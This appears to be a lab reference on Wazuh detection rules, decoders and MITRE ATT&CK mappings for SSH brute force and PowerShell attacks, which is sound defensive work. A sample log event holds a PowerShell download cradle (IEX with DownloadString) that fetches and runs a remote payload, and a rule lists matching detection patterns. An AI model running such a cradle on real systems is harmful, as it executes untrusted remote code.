# Detection Engineering & MITRE ATT&CK Mapping

A reference for intended detections, correlation rules, log decoding, and threat-framework alignments. The table below describes configuration intent; repository CI does not execute `wazuh-logtest` or test active response on a live agent. Use Wazuh's [custom rule guidance](https://documentation.wazuh.com/4.14/user-manual/ruleset/rules/custom.html) and test sample events against the exact installed ruleset before relying on a detection.

---

## 1. Rule Correlation & Escalation Matrix

| Attack Phase | Log Source | Matched Rule ID | Rule Level | Description | Escalation Trigger |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Initial Probing** | `/var/log/auth.log` | `5710` | 5 | `sshd: SSH authentication failed` | Track failure count per source IP |
| **SSH Brute-Force** | `/var/log/auth.log` | `100003` | 10 | `sshd: Maximum authentication attempts exceeded` | Intended action: `firewall-drop`; runtime unverified |
| **PowerShell Bypass** | `Microsoft-Windows-PowerShell/Operational` | `100005` | 10 | `Suspicious process creation: PowerShell ExecutionPolicy Bypass` | Forward to Shuffle Webhook |
| **Download Cradle** | `Microsoft-Windows-PowerShell/Operational` | `100004` | 12 | `PowerShell: DownloadString / IEX cradle detected` | Intended action: Windows response; runtime unverified |
| **C2 Service Creation** | `System.evtx` (Event 7045) | `100006` | 12 | `New Windows Service installed dynamically` | Intended action: Windows response; runtime unverified |

---

## 2. Comprehensive MITRE ATT&CK Matrix

```
┌─────────────────────────┬─────────────────────────┬─────────────────────────┬─────────────────────────┐
│   INITIAL ACCESS        │       EXECUTION         │       PERSISTENCE       │     DEFENSE EVASION     │
├─────────────────────────┼─────────────────────────┼─────────────────────────┼─────────────────────────┤
│ T1110.001               │ T1059.001               │ T1543.003               │ T1562.001               │
│ Password Guessing       │ PowerShell Scripting    │ Windows Service         │ Disable Security Tools  │
│ (Hydra SSH attack)      │ (IEX DownloadString)    │ (PsExec service drop)   │ (ExecutionPolicy Bypass)│
├─────────────────────────┼─────────────────────────┼─────────────────────────┼─────────────────────────┤
│   CREDENTIAL ACCESS     │    LATERAL MOVEMENT     │   COMMAND & CONTROL     │   IMPACT & RESPONSE     │
├─────────────────────────┼─────────────────────────┼─────────────────────────┼─────────────────────────┤
│ T1110.003               │ T1021.002               │ T1071.001               │ Automated Containment   │
│ Password Spraying       │ SMB / Admin Shares      │ Web Protocols (HTTP C2) │ firewall-drop & netsh   │
│ (Dictionary brute force)│ (Remote service exec)   │ (Payload download)      │ (Lab-only reference) │
└─────────────────────────┴─────────────────────────┴─────────────────────────┴─────────────────────────┘
```

---

## 3. Log Ingestion & Decoder Architecture

### Linux SSH Authentication Stream
Wazuh's native `sshd` decoder processes standard PAM authentication events:
```text
Aug 23 02:05:47 ubuntu-victim sshd[18402]: Failed password for invalid user admin from 192.168.1.105 port 49214 ssh2
```
- **Extracted Fields**:
  - `srcip`: `192.168.1.105`
  - `srcuser`: `admin`
  - `program_name`: `sshd`
  - `protocol`: `ssh2`

### Windows Script Block Logging (Event ID 4104)
Wazuh Windows Agent captures PowerShell Script Block logs in JSON format from the Windows Event Channel:
```json
{
  "win": {
    "system": {
      "providerName": "Microsoft-Windows-PowerShell",
      "eventID": "4104",
      "channel": "Microsoft-Windows-PowerShell/Operational",
      "computer": "win11-karim"
    },
    "eventdata": {
      "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
    }
  }
}
```
Rule `100004` inspects the `scriptBlockText` field for regex matches against known malicious execution patterns (`IEX`, `DownloadString`, `WebClient`, `-EncodedCommand`).
